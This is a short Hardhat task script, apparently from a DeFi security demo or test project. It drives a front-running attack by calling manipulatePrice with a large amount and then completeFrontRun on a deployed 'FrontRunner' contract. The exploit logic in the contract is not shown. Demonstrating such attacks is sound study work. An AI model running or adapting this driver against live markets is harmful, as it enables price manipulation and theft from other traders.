// tasks/frontRunAttack.ts

import { task } from "hardhat/config";
import { Wallet } from "ethers";

task("frontRunAttack", "Execute a front-running attack")
  .setAction(async (_, hre) => {
    // Hardcoded values
    const amountA = hre.ethers.utils.parseEther("100000");

    // Get signer from private key
    const privateKey = process.env.FRONTRUNNER_PRIVATE_KEY as string;
    const signer = new Wallet(privateKey, hre.ethers.provider);

    // Get FrontRunner contract instance
    const frontRunnerDeployment = await hre.deployments.get("FrontRunner");
    const frontRunnerContract = await hre.ethers.getContractAt(
      "FrontRunner",
      frontRunnerDeployment.address,
      signer
    );

    // Execute the front-running attack
    await frontRunnerContract.manipulatePrice(amountA);

    console.log("Price manipulated!");

    await frontRunnerContract.completeFrontRun();

    console.log("Front-running attack completed!");
  });
